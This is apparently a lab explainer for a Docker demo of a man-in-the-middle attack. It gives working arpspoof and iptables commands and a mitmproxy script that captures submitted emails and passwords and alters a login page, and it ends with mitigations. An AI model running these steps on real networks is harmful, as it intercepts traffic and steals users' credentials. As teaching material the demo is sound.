# Technical Explanation of the Docker MITM Attack

This document provides a technical explanation of how the Man-in-the-Middle (MITM) attack works in this Docker demonstration.

## Network Architecture

### Container Setup
```
┌─────────┐      ┌─────────┐      ┌─────────┐
│  Alice  │ ←──→ │   Eve   │ ←──→ │   Bob   │
│(Firefox)│      │ (MITM)  │      │ (HTTP)  │
└─────────┘      └─────────┘      └─────────┘
172.19.0.2       172.19.0.x       172.19.0.3
```

- All containers are connected to a Docker bridge network (`mitm`)
- Each container gets an IP address in the 172.19.0.0/16 subnet
- DNS resolution is handled by Docker's built-in DNS server

## Attack Components

### 1. ARP Spoofing (Address Resolution Protocol)

```bash
arpspoof -t 172.19.0.2 172.19.0.3  # Tell Alice that Eve is Bob
arpspoof -t 172.19.0.3 172.19.0.2  # Tell Bob that Eve is Alice
```

#### How ARP Spoofing Works:
1. ARP maps IP addresses to MAC addresses in local networks
2. Eve sends fake ARP responses to:
   - Tell Alice that Bob's IP (172.19.0.3) is at Eve's MAC address
   - Tell Bob that Alice's IP (172.19.0.2) is at Eve's MAC address
3. This makes all traffic between Alice and Bob pass through Eve

### 2. IP Forwarding and Traffic Redirection

```bash
# Enable IP forwarding in Eve's container
sysctl net.ipv4.ip_forward=1

# Redirect HTTP traffic to mitmproxy
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8082
```

#### How Traffic Redirection Works:
1. IP forwarding allows Eve to pass traffic between Alice and Bob
2. iptables NAT rule redirects HTTP traffic (port 80) to mitmproxy (port 8082)
3. Traffic flow:
   ```
   Alice:80 → Eve:80 → iptables REDIRECT → Eve:8082 (mitmproxy) → Eve:80 → Bob:80
   ```

### 3. MITM Proxy (mitmproxy)

```python
# proxy.py
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    if flow.request.method == "POST":
        try:
            form_data = dict(flow.request.urlencoded_form)
            if "email" in form_data and "password" in form_data:
                print(f"[*] Captured credentials:")
                print(f"Email: {form_data['email']}")
                print(f"Password: {form_data['password']}")
        except:
            pass

def response(flow: http.HTTPFlow) -> None:
    if "text/html" in flow.response.headers.get("content-type", ""):
        html = flow.response.content.decode()
        if "ZAICO Login" in html:
            # Modify the response
            html = html.replace('</style>', '''
                .hacked-message {
                    display: none;
                }
            </style>
            <div class="hacked-message">This page has been compromised!</div>
            ''')
        flow.response.content = html.encode()
```

#### How MITM Proxy Works:
1. Runs in transparent mode on port 8082
2. Intercepts HTTP traffic:
   - Request phase: Captures form submissions (credentials)
   - Response phase: Modifies HTML content
3. Maintains two separate connections:
   - Client-side: Acts as the server to Alice
   - Server-side: Acts as the client to Bob

## Security Implications

### Attack Capabilities
1. **Passive Attacks**:
   - Eavesdropping on unencrypted traffic
   - Capturing sensitive form data
   - Session monitoring

2. **Active Attacks**:
   - Content modification
   - Request/response manipulation
   - JavaScript injection

### Mitigations
1. **HTTPS**: Would require SSL/TLS certificate validation
2. **Certificate Pinning**: Would prevent MITM even with trusted certificates
3. **ARP Security**:
   - Static ARP entries
   - ARP spoofing detection
   - Network segmentation

## Technical Limitations

1. **Docker Network**:
   - Limited to containers on the same bridge network
   - No external network access in this demo

2. **HTTP Only**:
   - Demo works with HTTP traffic
   - HTTPS would require additional certificate setup

3. **Platform Specific**:
   - Some images may require platform-specific builds (arm64 vs amd64)
   - Network capabilities must be enabled in containers 